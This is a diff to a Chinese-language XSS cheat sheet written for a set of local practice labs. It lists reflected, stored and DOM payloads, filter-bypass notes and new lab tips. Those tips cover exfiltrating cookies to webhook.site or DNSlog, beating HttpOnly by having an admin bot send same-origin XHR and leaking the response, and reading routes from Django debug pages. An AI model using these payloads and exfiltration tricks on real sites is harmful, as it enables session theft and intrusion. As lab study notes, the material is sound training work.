@@ -1,7 +1,10 @@
-# XSS 速查（照着做就能把题做完）
+# XSS 速查 v2（照着做就能把题做完）
 
 > 用法：做题不记得了 → 翻到对应知识点 → 照着 payload 改
-> 2026-08-18 更新：加入实战踩坑（innerHTML 不执行 script / + 变空格 / 双写嵌套vs重叠 / confirm 实测）
+> 验证标注：✓(YYYY-MM-DD)=当日靶场实弹；未标注 = 课程实弹(2026-08-28 xs1~xs7 全通)或教材知识
+> 靶场：http://localhost:8084/（xs1 反射 / xs2 存储 / xs3 DOM / xs4 偷Cookie / xs5 过滤 / xs6 打管理员 / xs7 裸子串毕业考）
+> payload 走 URL 时遵守编码规则：`+`→%2B、`&`→%26、空格→%20、`#`→%23（+ 号三态见 SQL 表 2.4；CMD 引号规则见黑盒开局 第 3 节）
+> 2026-08-30 v2 对齐：头图例/靶场端口/坑清单 +5 条实战坑（见第 7 节 8~12 条）
 
 ========================================================
 ## 0. 拿到题先走这个流程
@@ -25,12 +28,12 @@
 ========================================================
 
 ```html
-<script>alert(1)</script>              -- 最基础（页面加载即执行）
-<img src=x onerror=alert(1)>           -- 图片加载失败触发（最常用）
-<svg onload=alert(1)>                  -- svg 加载触发
-<a href="javascript:alert(1)">点我</a>  -- 链接点击触发（需要用户点）
-<input onfocus=alert(1) autofocus>     -- 自动聚焦触发（无需交互，onfocus+autofocus 组合）
-<iframe src="javascript:alert(1)">    -- iframe 版
+<script>alert(1)</script>              <!-- 最基础（页面加载即执行） -->
+<img src=x onerror=alert(1)>           <!-- 图片加载失败触发（最常用） -->
+<svg onload=alert(1)>                  <!-- svg 加载触发 -->
+<a href="javascript:alert(1)">点我</a>  <!-- 链接点击触发（需要用户点） -->
+<input onfocus=alert(1) autofocus>     <!-- 自动聚焦触发（无需交互，onfocus+autofocus 组合） -->
+<iframe src="javascript:alert(1)">    <!-- iframe 版 -->
 ```
 
 **弹窗函数三兄弟**：`alert(1)` / `confirm(1)` / `prompt(1)`
@@ -52,8 +55,9 @@
 
 ### 反射型
 ```url
-http://靶场/xs1/?q=<script>alert(1)</script>
+http://localhost:8084/xs1/?q=<script>alert(1)</script>
 ```
+✓(2026-08-30 复验)：payload 原样出现在响应里 = 反射点确认
 
 ### 存储型
 ```html
@@ -63,7 +67,7 @@ http://靶场/xs1/?q=<script>alert(1)</script>
 
 ### DOM 型
 ```url
-http://靶场/xs3/#<img src=x onerror=alert(1)>
+http://localhost:8084/xs3/#<img src=x onerror=alert(1)>
 ```
 ⚠️ **关键坑**：innerHTML 塞 `<script>` 标签**不会执行**（HTML5 规范）！DOM 型必须用**事件型**（img onerror / input onfocus / svg onload）
 
@@ -99,6 +103,8 @@ if ($c !== '') {
     echo "OK, got: " . htmlspecialchars($c);
 }
 ```
+
+**远程实例没有本机监听条件时**（2026-08-30 实战）：收集器换 webhook.site（建器/收数见坑清单第 11 条），payload 里的 `/xss/hack.php?c=` 换成 `https://webhook.site/<uuid>?c=`；bot 场景带 HttpOnly 时按坑清单第 10 条走"bot 自己发同源 XHR 外带响应"。
 
 ========================================================
 ## 4. 过滤绕过速查
@@ -158,6 +164,11 @@ if ($c !== '') {
 5. **confirm/prompt 在 Chrome 需要用户手势，Firefox 实测能弹** → 以环境实测为准，alert 被过滤优先试 confirm
 6. **容器重建会清数据**（留言/记录文件全没）→ 重建后重打
 7. **DOM 型 payload 在 # 后面** → 不发给服务器，服务器日志查不到
+8. **JS 字符串里出现字面 `</script>` 会提前终止整个脚本块**（2026-08-30 实战：外带载荷整段失活、零报错）→ 字符串里写 `<\/script>`，收尾的 `</script>` 只留真收尾
+9. **无头 bot 不一定有 fetch/Promise**（2026-08-30 实战：PhantomJS/2.0.0 两者皆无，fetch 版载荷第一行就死）→ 先发一发 `new Image().src='收集器?tag=HELLO'` 确认执行环境，正式载荷用 XMLHttpRequest + new Image 兜底，分块外带防 URL 超长
+10. **bot 的 cookie 带 HttpOnly 时 document.cookie 偷不到 sessionid** → 让 bot 自己以它的会话发同源 XHR（cookie 自动附带）打目标接口，把响应内容外带回来
+11. **打远程实例（无本机监听条件）用 webhook.site 当收集器**：POST /token 建收集器 → payload 外带到 https://webhook.site/<uuid> → GET /token/<uuid>/requests 收数据，DNSlog.cn 是备用信道（HTTP 被墙时 DNS 解析常能过）
+12. **Django DEBUG=True 的 404 页会泄全部 URL 路由** → 黑盒第一步先随便访问一个不存在的路径看路由表
 
 ## 心法
 
